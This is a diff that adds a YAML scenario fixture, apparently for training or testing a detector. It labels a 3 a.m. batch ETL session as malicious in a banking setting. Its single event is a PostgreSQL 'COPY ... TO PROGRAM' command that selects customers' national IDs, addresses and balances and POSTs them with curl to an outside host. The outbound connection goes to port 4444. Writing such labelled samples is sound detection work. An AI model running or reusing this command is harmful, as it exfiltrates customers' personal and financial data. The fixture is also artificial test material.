@@ -1,0 +1,29 @@
+scenario_id: banking_etl_exfil_mal_0001
+family_id: banking_etl_pair_0001
+domain: banking
+matched_pair_id: banking_etl_pair_0001
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - role
+  varied:
+  - sql_content
+  - connects_to_destination
+time_of_day: 03:00
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: replication
+  role: batch_etl_service
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.7665322347858674
+  events:
+  - step_id: replicate
+    sql: COPY (SELECT c.national_id, c.address, a.balance, a.account_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'
+    connects_to:
+      ip: 45.33.12.9
+      port: 4444
